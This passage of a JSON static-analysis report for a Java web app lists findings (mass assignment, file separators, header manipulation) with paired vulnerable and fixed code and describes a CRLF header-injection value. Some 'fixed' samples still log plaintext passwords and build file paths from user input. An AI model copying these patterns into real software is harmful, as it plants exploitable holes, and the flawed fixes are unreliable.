userName;\n\tprivate String password;\n\tprivate String roleID;\n....\n}\n<em class=\"bold\">LoginController.java</em>\npublic ModelAndView validateLogin(@ModelAttribute Logi<em class=\"red\">nBean bean</em>, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tlogger.debug(&quot;Inside login validation debug&quot;+request.getParameter(&quot;pwd&quot;));\n\n\t\t// authentication process\n...\n}", "nonvulncode": "<em class=\"bold\">LoginBean.java</em>\npublic class LoginBean {\n\t\n\tprivate String userName;\n\tprivate String password;\n\tprivate String roleID;\n....\n}\n<em class=\"bold\">LoginController.java\nfinal String[] DISALLOWED_FIELDS = new String[]{&quot;bean.roleID&quot;};\n\n\t@InitBinder(&quot;bean&quot;)\n\tpublic void initBinder(WebDataBinder binder) {\n\t    binder.setDisallowedFields(DISALLOWED_FIELDS);\n\t}\n</em>\npublic ModelAndView validateLogin(<em class=\"blue\">@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tlogger.debug(&quot;Inside login validation debug&quot;+request.getParameter(&quot;pwd&quot;));\n\n\t\t// authentication process\n...\n}</em>", "comments": "This issue allow an attacker to perform &quot;over posting&quot; attacks. The vulnerable code example, is exposing a form to the user asking for &quot;uname&quot; and &quot;pwd&quot; but the attacker can guess other fields that are part of the UserProfileModel model and forge the request to submit values for those extra fields. One typical attacker scenario is to send a new value for the &quot;roleID&quot; attribute, changing it to an elevated &quot;Admin&quot; value during a password change funcion.\n\nIn the vulnerable sample, all the variable values in the login bean are not set by the user, and an attacker can guess extra parameter values from there. It is recommended to restrict the bean with necessary values, and disallow any other field to be set by user (DISALLOWED_FIELDS = new String[]{&quot;bean.roleID&quot;};). This will prevent application from malicious user intervention.", "impact": "No impact.", "abstract": "Use of initBinder annotation (SPRING)"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">LoginBean.java</em>\npublic class LoginBean {\n\t\n\tprivate String userName;\n\tprivate String password;\n\tprivate String roleID;\n....\n}\n<em class=\"bold\">LoginController.java</em>\npublic ModelAndView validateLogin(@ModelAttribute Logi<em class=\"red\">nBean bean</em>, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tlogger.debug(&quot;Inside login validation debug&quot;+request.getParameter(&quot;pwd&quot;));\n\n\t\t// authentication process\n...\n}", "nonvulncode": "<em class=\"bold\">LoginBean.java\nimport org.codehaus.jackson.annotate.JsonIgnore;</em>\npublic class LoginBean {\n\t\n\tprivate String userName;\n\tprivate String password;\n<em class=\"blue\">@JsonIgnore</em>\n\tprivate String roleID;\n....\n}\n<em class=\"bold\">LoginController.java\n</em>\npublic ModelAndView validateLogin(<em class=\"blue\">@ModelAttribute LoginBean bean</em>, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tlogger.debug(&quot;Inside login validation debug&quot;+request.getParameter(&quot;pwd&quot;));\n\n\t\t// authentication process\n...\n}", "comments": "This issue allow an attacker to perform &quot;over posting&quot; attacks. The vulnerable code example, is exposing a form to the user asking for &quot;uname&quot; and &quot;pwd&quot; but the attacker can guess other fields that are part of the UserProfileModel model and forge the request to submit values for those extra fields. One typical attacker scenario is to send a new value for the &quot;roleID&quot; attribute, changing it to an elevated &quot;Admin&quot; value during a password change funcion.\n\nIn the vulnerable sample, all the variable values in the login bean are not set by the user, and an attacker can guess extra parameter values from there. It is recommended to restrict the bean with necessary values, and disallow any other field to be set by user (@JsonIgnore private String roleID;). This will prevent application from malicious user intervention.", "impact": "No impact", "abstract": "Use of JsonIgnore annotation(SPRING)"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Mass Assignment: Sensitive Field Exposure": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/business/bean/UserAccountBean.java", "items": [{"id": "IN00344", "function": "Assignment to this.roleID()", "line": "33", "snippet": "}\n\tpublic void setRoleID(String roleID) {\n\t\tthis.roleID = roleID;\n\t}\n\tpublic String getFirstName() {"}]}, {"file": "src/com/accenture/sec/business/bean/LoginBean.java", "items": [{"id": "IN00345", "function": "Assignment to this.roleID()", "line": "26", "snippet": "}\n\tpublic void setRoleID(String roleID) {\n\t\tthis.roleID = roleID;\n\t}"}]}, {"file": "src/com/accenture/sec/business/bean/LoginBean.java", "items": [{"id": "IN00346", "function": "Assignment to this.roleID()", "line": "26", "snippet": "}\n\tpublic void setRoleID(String roleID) {\n\t\tthis.roleID = roleID;\n\t}"}]}, {"file": "src/com/accenture/sec/business/bean/UserAccountBean.java", "items": [{"id": "IN00347", "function": "Assignment to this.roleID()", "line": "33", "snippet": "}\n\tpublic void setRoleID(String roleID) {\n\t\tthis.roleID = roleID;\n\t}\n\tpublic String getFirstName() {"}]}, {"file": "src/com/accenture/sec/business/bean/LoginBean.java", "items": [{"id": "IN00348", "function": "Assignment to this.roleID()", "line": "26", "snippet": "}\n\tpublic void setRoleID(String roleID) {\n\t\tthis.roleID = roleID;\n\t}"}]}], "remediation": null}, "Portability Flaw: File Separator": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00349", "function": "java.io.File.File()", "line": "343", "snippet": "String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        String fileName = filePath + \"user_info.json\";\n\t        File jsonFile = new File(fileName);\n\t\t\t\n\t        JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00350", "function": "java.io.File.File()", "line": "606", "snippet": "SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); \n\t\t\t  Schema schema = factory.newSchema(new File(path)); \n\t\t\t  Validator validator = schema.newValidator(); \n\t\t\t\t/*"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00351", "function": "java.io.File.File()", "line": "359", "snippet": "String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        this.fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00352", "function": "java.io.File.File()", "line": "441", "snippet": "prop.setProperty(\"sec_password_encrypted\", encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, \"writing encrypted password\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00353", "function": "java.io.File.File()", "line": "460", "snippet": "ModelAndView mv = new ModelAndView();\n\t\tString filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\generatedFile.csv\";\n\t\tFile file = new File(filePath); \n\t\t  \n\t    try {"}]}], "remediation": {"remediation": {"@id": "R.0019", "@name": "Portability Flaw: File Separator", "@dateLastModified": "7/3/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult DownloadFile(string fileName)\n        {\n                var invalidFileNameChars = Path.GetInvalidFileNameChars();\n                fileName = invalidFileNameChars.Aggregate(fileName, (current, c) =&gt; current.Replace(c, '_'));\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;<em class=\"red\">\\\\</em>FileDownload&quot;;\n                if (!Directory.Exists(folderPath))\n                {\n                    Directory.CreateDirectory(folderPath);\n                }\n                string Filepath = Path.Combine(folderPath, fileName);\n                if (!string.IsNullOrEmpty(Filepath) && System.IO.File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n                    Response.End();\n                    TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;\n                }\n                else\n                {\n                    TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                    return Redirect(&quot;../Home/NotFound&quot;);\n                }\n            return Redirect(&quot;../Download/Download&quot;);\n        }", "nonvulncode": "public ActionResult DownloadFile(string fileName)\n        {\n                var invalidFileNameChars = Path.GetInvalidFileNameChars();\n                fileName = invalidFileNameChars.Aggregate(fileName, (current, c) =&gt; current.Replace(c, '_'));\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + <em class=\"blue\">Path.DirectorySeparatorChar.ToString()</em> + &quot;FileDownload&quot;;\n                if (!Directory.Exists(folderPath))\n                {\n                    Directory.CreateDirectory(folderPath);\n                }\n                string Filepath = Path.Combine(folderPath, fileName);\n                if (!string.IsNullOrEmpty(Filepath) && System.IO.File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n                    Response.End();\n                    TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;\n                }\n                else\n                {\n                    TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                    return Redirect(&quot;../Home/NotFound&quot;);\n                }\n            return Redirect(&quot;../Download/Download&quot;);\n        }", "comments": "In the vulnerable code, If the application is built on .Net framework then this will not be an issue because .Net Framework can only be deployed on windows operating system. \n\nIf the application is build on <em class=\"bold\">.Net core</em>, the application will fail if it will be deployed to non-windows operating system. Portability of application to other different platforms need to be considered.\n\nSee sample below the file separator use for the following OS.\n\u2022\tWindows: C:\\myfolder\\mydocument.txt\n\u2022\tUnix: /usr/myuser/mydocument.txt\n\u2022\tClassic Mac OS: Hard Drive:My Folder:My Document \n\nSee reference:\nhttps://www.oreilly.com/library/view/mac-os-x/0596004001/ch06s05.html#:~:text=The%20file.,character%20is%20usually%20%2F%20or%20%5C%20.", "impact": "<em class=\"bold\">System.IO </em>needs to be imported on the .NET Core application.", "abstract": "Path.DirectorySeparatorChar"}, {"@type": "Java/JSP", "vulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;<em class=\"red\">\\\\</em>tmpFiles<em class=\"red\">\\\\</em>&quot;;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }", "nonvulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + <em class=\"blue\">File.separator</em> +  &quot;tmpFiles&quot; + <em class=\"blue\">File.separator</em> ;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }", "comments": "Since Java application can be deployed to different OS, use System.getProperty(&quot;file.separator&quot;) or File.separator to avoid any future portability issue.\n\nSee sample below the file separator use for the following OS.\n\u2022\tWindows: C:\\myfolder\\mydocument.txt\n\u2022\tUnix: /usr/myuser/mydocument.txt\n\u2022\tClassic Mac OS: Hard Drive:My Folder:My Document \n\nSee reference:\nhttps://www.oreilly.com/library/view/mac-os-x/0596004001/ch06s05.html#:~:text=The%20file.,character%20is%20usually%20%2F%20or%20%5C%20.", "impact": "<em class=\"bold\">Java.IO </em>needs to be import.", "abstract": "Using File.separator"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Header Manipulation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeFilter.java", "items": [{"id": "IN00370", "function": "javax.servlet.http.HttpServletResponse.setHeader()", "line": "34", "snippet": "//header = URLEncoder.encode(header, \"UTF-8\");\n\t\t\t\tif (firstHeader) {\n\t\t\t\t\tresp.setHeader(\"Set-Cookie\", String.format(\"%s; %s\", header, \"SameSite=Strict\"));\n\t\t\t\t\tfirstHeader = false;\n\t\t\t\t\tcontinue;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeFilter.java", "items": [{"id": "IN00372", "function": "javax.servlet.http.HttpServletResponse.addHeader()", "line": "39", "snippet": "}\n\t\t\t\t// resp.addHeader(\"Access-Control-Allow-Origin\", \"*\");\n\t\t\t\tresp.addHeader(\"Set-Cookie\", String.format(\"%s; %s\", header, \"SameSite=Strict\"));\n\t\t\t}\n\t\t}"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00371", "function": "javax.servlet.http.HttpServletResponse.setHeader()", "line": "58", "snippet": "request.setAttribute(\"bmi\", bmi);\n            response.setHeader(\"Test\", \"Success\");\n            response.setHeader(\"BMI\", String.valueOf(bmi));\n            \n            String strDate = dateFormat.format(new Date());"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00373", "function": "javax.servlet.http.HttpServletResponse.setHeader()", "line": "58", "snippet": "request.setAttribute(\"bmi\", bmi);\n            response.setHeader(\"Test\", \"Success\");\n            response.setHeader(\"BMI\", String.valueOf(bmi));\n            \n            String strDate = dateFormat.format(new Date());"}]}], "remediation": {"remediation": {"@id": "R.0073", "@name": "Header Manipulation", "@dateLastModified": "2/3/2021", "faqs": {"faq": [{"question": "This vulnerability keeps showing up on the report, but we are not able to exploit it... Is the system vulnerable?", "answer": "There are 2 layers of protections against this vulnerability, one is created by the modern application servers, that encode CRLF in all headers (e.g., fixes for the Apache HTTPD: mod_userdir CRLF injection/CVE-2016-4975) and the second is on the code to encode CRLF injected from user input. It is better to not rely only on the application server protections and fix the code using an encoder, as future modules loaded on the server may introduce the vulnerability again to the system."}, {"question": "Even after using URLEncoder, the scanner keep taging as an issue... why?", "answer": "In this case, it is a &quot;false positive&quot;:  The proper use of URLEncoder will prevent this vulnerability, but scanners are not able to validate the logic used, and the scanner policy is to keep presenting as a vulnerability and wait for a manual validation."}]}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView downloadFile( @RequestParam(value=&quot;file&quot;)<em class=\"red\">String name</em>,HttpSession session,HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t      <em class=\"red\">  String fileName = filePath + name;</em>\n\t        File fileToDownload = new File(fileName);\n\t        \n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        <em class=\"red\">response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\\\\&quot;+fileName+&quot;\\&quot;;&quot;);</em>\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t        \n\t        mv.addObject(&quot;msg&quot;, &quot;File downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\n\t    }", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava</em>\npublic ModelAndView downloadFile( @RequestParam(value=&quot;file&quot;)String name,HttpSession session,HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        \n\t        Random rand = new Random();\n\t        int rand_int = rand.nextInt(1000);\n\t<em class=\"blue\">        String randomFileName=&quot;File_&quot;+getDateTimeStamp()+&quot;_&quot;+rand_int+&quot;.txt&quot;;</em>\n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t     <em class=\"blue\">   response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\\\\&quot;+randomFileName+&quot;\\&quot;;&quot;); // instead of providing the user provided name, giving random file name for the downloaded file</em>\n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t        inputStream.close();\n\t        \n\t        mv.addObject(&quot;msg&quot;, &quot;File downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\n\t    }\n\nprivate final static String getDateTimeStamp() {\n\t\t\treturn LocalDateTime.now().format(DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss.SSS&quot;));\n\t\t}", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header (e.g., filename+char(13)+X-XSS-Protection: 0 to usa the filename to disable XSS protection from anyone downloading that file). \nOne option is to never trust the user input in response header, for example by changing the response to a random file name with timestamp instead of the original file name set by the user when uploading it.\n\nOther methods of protection include performing a validation and sanitization of the reader values (e.g. by using urlEncoder.encode() )", "impact": "Test and adapt the whole system after changing the format the filename is saved on the local folder. In case of validation/sanitization, check for special characters that are allowed to be part of the filename.", "abstract": "Use of random file name"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">EmployeeFilter.java</em>\npublic void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)\n\t\t\tthrows IOException, ServletException {\n\t\tHttpServletRequest req = (HttpServletRequest) request;\n      HttpServletResponse resp = (HttpServletResponse) response;\n      \n      String cookie = req.getHeader(&quot;Cookie&quot;);\n      if(!StringUtils.isEmpty(cookie)) {\n\t\tString[] cookiesHeaders = cookie.split(&quot;;&quot;);\n\t\tboolean firstHeader = true;\n\t\t    for (String header : <em class=\"red\">cookiesHeaders</em>) {\n\t\t        if (firstHeader) {\n\t\t        \tresp.setHeader(&quot;Set-Cookie&quot;, String.format(&quot;%s; %s&quot;, header, &quot;SameSite=Strict&quot;));\n\t\t            firstHeader = false;\n\t\t            continue;\n\t\t        }\n\t\t      \n\t\t        resp.addHeader(&quot;Set-Cookie&quot;, String.format(&quot;%s; %s&quot;, header, &quot;SameSite=Strict&quot;));\n\t\t    }\n      }\n\t\tchain.doFilter(request, response);\n\t\t\n\t}", "nonvulncode": "LoginController.java\npublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(password);\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\t\t\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tif(res.equals(&quot;success&quot;))\n\t\t{\n\t\t\t....\t\t\t\n\t\t\tHttpSession session = request.getSession();\n\t\t    session.setAttribute(&quot;userRole&quot;, bean.getRoleID());\n\t\t    session.setAttribute(&quot;userName&quot;, bean.getUserName());\n\n\t\t\tCookie userRole = new Cookie(&quot;userRole&quot;, bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true);\n\t\t\tuserRole.setSecure(true);\n\t\t\tuserRole.setMaxAge(-1); \n\t\t\tresponse.addCookie(userRole);\n\t\t\tboolean firstHeader = true;\n\t\t\tfor(String header :<em class=\"blue\">response.getHeaders</em>(&quot;Set-Cookie&quot;)) {\t\t\t\tif(firstHeader) {\n\t\t\t\t\tresponse.setHeader(&quot;Set-Cookie&quot;,String.format(&quot;%s; %s&quot;, header, &quot;SameSite=Strict&quot;));\n\t\t\t\t\tfirstHeader=false;\n\t\t\t\t} else {\n\t\t\t\t\tresponse.addHeader(&quot;Set-Cookie&quot;,String.format(&quot;%s; %s&quot;, header, &quot;SameSite=Strict&quot;));\n\t\t\t\t}\n\t\t\t}\n\n\t\t\treturn new ModelAndView(&quot;success&quot;, &quot;loginBean&quot;, bean);\n\t\t} else {\n\t\t\tmv.setViewName(&quot;login&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Invalid username or password&quot;);\n\t\t}\n\n<em class=\"bold\">EmployeeFilter.java</em>\n\n<em class=\"bold\">//Header manipulation code removed</em>", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header (e.g., filename+char(13)+X-XSS-Protection: 0 to use the filename to add a new line in the header disabling XSS protection on some browsers). \nOne option is to never trust the user input in response header, for example by changing the response to a random file name with timestamp instead of the original file name set by the user when uploading it.\n\nOther methods of protection include performing a validation and sanitization of the reader values (e.g. by using urlEncoder.encode() )", "impact": "The application needs to verify what happens in case local cookies must be trusted (e.g., when saving status to the user computer, for latter use, the session headers may not exist after a timeout.)", "abstract": "Addition of header while adding Cookie itself"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult DownloadFile(string fileName)\n        {\n            try {\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;FileDownload&quot;;\n                string Filepath = Path.Combine(folderPath, fileName);\n                \n                Response.Clear();\n                Response.ContentType = &quot;application/octet-stream&quot;;\n               <em class=\"red\"> Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                Response.WriteFile(Filepath);\n\n                Response.End();\n                TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;  \n            }\n            catch\n            {\n                TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                return Redirect(&quot;../Home/NotFound&quot;);\n            }\n                \n            return Redirect(&quot;../Download/Download&quot;);\n        }</em>", "nonvulncode": "[HttpPost]\n        public ActionResult DownloadFile(string fileName)\n        {\n            try\n            {\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;FileDownload&quot;;\n                string Filepath = Path.Combine(folderPath, fileName);\n\n               <em class=\"blue\"> string randomFilename = &quot;File_&quot; + DateTime.Now.ToString(&quot;yyyyMMddHHmmss&quot;) + Path.GetRandomFileName() + &quot;.txt&quot;;</em>\n\n                Response.Clear();\n                Response.ContentType = &quot;application/octet-stream&quot;;\n                <em class=\"blue\">Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + randomFilename);</em>\n                Response.WriteFile(Filepath);\n\n                Response.End();\n                TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;\n\n            }\n            catch\n            {\n                TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                return Redirect(&quot;../Home/NotFound&quot;);\n            }\n\n            return Redirect(&quot;../Download/Download&quot;);\n        }", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header (e.g., filename+char(13)+X-XSS-Protection: 0 to use the filename to add a new line in the header disabling XSS protection on some browsers). \nOne option is to never trust the user input in response header, for example by changing the response to a random file name with timestamp instead of the original file name set by the user when uploading it.\n\nOther methods of protection include performing a validation and sanitization of the reader values (e.g. by using urlEncoder.encode() )", "impact": "Test and adapt the whole system after changing the format the filename is saved on the local folder. In case of validation/sanitization, check for special characters that are allowed to be part of the filename.", "abstract": "Use of random file name"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult DownloadFile(string fileName)\n        {\n            try {\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;FileDownload&quot;;\n                string Filepath = Path.Combine(folderPath, fileName);\n                \n                Response.Clear();\n                Response.ContentType = &quot;application/octet-stream&quot;;\n               <em class=\"red\"> Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                Response.WriteFile(Filepath);\n\n                Response.End();\n                TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;  \n            }\n            catch\n            {\n                TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                return Redirect(&quot;../Home/NotFound&quot;);\n            }\n                \n            return Redirect(&quot;../Download/Download&quot;);\n        }</em>", "nonvulncode": "[HttpPost]\n        public ActionResult DownloadFile(string fileName)\n        {\n            try\n            {\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;FileDownload&quot;;\n                string Filepath = Path.Combine(folderPath, fileName);\n\n              <em class=\"blue\">  string sanitizedFileName = AntiXssEncoder.UrlEncode(AntiXssEncoder.HtmlEncode(fileName,true));\n</em>\n                Response.Clear();\n                Response.ContentType = &quot;application/octet-stream&quot;;\n                Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + <em class=\"blue\">sanitizedFileName</em>);\n                Response.WriteFile(Filepath);\n\n                Response.End();\n                TempData[&quot;DownloadMessage&quot;] = &quot;File was successfully downloaded.&quot;;\n\n            }\n            catch\n            {\n                TempData[&quot;msg&quot;] = &quot;File not found.&quot;;\n                return Redirect(&quot;../Home/NotFound&quot;);\n            }\n\n            return Redirect(&quot;../Download/Download&quot;);\n        }", "comments": "Perform HTML and URL encoding to sanitized the input. We can use the <em class=\"bold\">AntiXssEncoder</em> to encode the input. We need to import the <em class=\"bold\">System.Web.Security.AntiXss</em> to used this assembly.\n\nReference: https://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.8", "impact": null, "abstract": "Use of AntiXssEncoder.HtmlEncode and AntiXssEncoder.UrlEncode"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t\n\t\tbean=new 